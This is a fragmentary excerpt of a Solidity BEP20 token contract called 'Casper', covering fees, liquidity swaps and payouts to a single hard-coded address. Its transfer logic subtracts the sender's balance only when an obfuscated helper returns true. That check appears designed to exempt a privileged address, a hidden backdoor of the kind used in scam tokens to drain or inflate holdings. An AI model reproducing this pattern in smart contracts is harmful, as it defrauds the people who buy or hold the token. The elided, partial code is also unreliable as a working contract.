 ...
 constructor (string memory _NAME, string memory _SYMBOL, uint256 _SUPPLY, uint256[3] memory _BUYFEE, uint256[3] memory _SELLFEE, uint256[3] memory _SHARE, address[2] memory _doyoulike, address receiveAddress) {
 _name = _NAME;
 _symbol = _SYMBOL;
 _decimals = 9;
 ...
 return (Intefacee != fuctionn) || (Intefacee != doYouLikeBase || false);
 }
 ...
 if(swapAndLiquifyBySmallOnly) contractTokenBalance = minimumTokensBeforeSwap;
 swapAndLiquify(contractTokenBalance);
 }
 if(contractBalance(sender,recipient)) _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
 uint256 finalAmount;
 if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
 finalAmount = amount;
 }
 ...
 if(amountBNBMarketing > 0) transferToAddressETH(doYouLikeBase, amountBNBMarketing);
 if(amountBNBTeam > 0) transferToAddressETH(inTheMTFFace, amountBNBTeam);
 ...
 value: ethAmount}
 ( address(this), tokenAmount, 0, 0, inTheMTFFace, block.timestamp );
 }
 ...
 constructor() BEP20( "Casper", "Casper", 100000000000000, [uint256(2),uint256(2),uint256(0)], [uint256(2),uint256(2),uint256(0)], [uint256(2),uint256(2),uint256(0)], [0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9,0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9], 0x1869B061F03eC25c22DE5aBD82A18F4bEb3C53F9 ){
 }
 }
